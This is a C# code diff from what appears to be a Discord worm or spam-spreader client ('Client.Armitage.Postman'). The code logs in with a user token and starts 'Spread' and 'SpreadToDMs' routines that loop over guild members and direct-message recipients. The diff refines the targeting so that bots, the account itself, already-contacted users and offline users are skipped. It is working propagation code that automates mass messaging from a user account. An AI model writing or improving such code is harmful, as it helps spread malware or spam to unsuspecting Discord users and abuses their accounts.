@@ -45,14 +45,16 @@ namespace Client.Armitage.Postman
 
                             var _client = new DiscordSocketClient();
 
-                            _client.Disconnected += (s) => {
+                            _client.Disconnected += (s) =>
+                            {
                                 Console.WriteLine(s.ToString());
                                 return null;
                             };
 
                             await _client.LoginAsync(TokenType.User, token);
 
-                            if (_client.LoginState == LoginState.LoggedIn) {
+                            if (_client.LoginState == LoginState.LoggedIn)
+                            {
 
                                 await _client.StartAsync();
 
@@ -64,7 +66,8 @@ namespace Client.Armitage.Postman
 
                                 new Thread(() => { Spread(_client); }).Start();
                             }
-                            else {
+                            else
+                            {
                                 Console.WriteLine($"State was : {_client.LoginState.ToString()}");
                             }
 
@@ -106,13 +109,11 @@ namespace Client.Armitage.Postman
 
             foreach (var guild in guilds)
             {
-                var members = guild.Users;
+                var members = guild.Users.Where(x => !x.IsBot && x.Id != me.CurrentUser.Id && x.Status != UserStatus.Offline);
 
                 foreach (var member in members)
                 {
-                    if (!_doneids.Contains(member.Id) &&
-                        !member.IsBot &&
-                        member.Id != me.CurrentUser.Id)
+                    if (!_doneids.Contains(member.Id))
                         try
                         {
                             _doneids.Add(member.Id);
@@ -132,14 +133,11 @@ namespace Client.Armitage.Postman
         }
         private void SpreadToDMs(DiscordSocketClient me)
         {
-            var dms = me.DMChannels;
+            var dms = me.DMChannels.Where(x => !x.Recipient.IsBot && x.Recipient.Id != me.CurrentUser.Id);
 
             foreach (var channel in dms)
             {
-                if (!_doneids.Contains(channel.Recipient.Id) &&
-                    !channel.Recipient.IsBot &&
-                    channel.Recipient.Id != me.CurrentUser.Id
-                    )
+                if (!_doneids.Contains(channel.Recipient.Id))
                     try
                     {
 
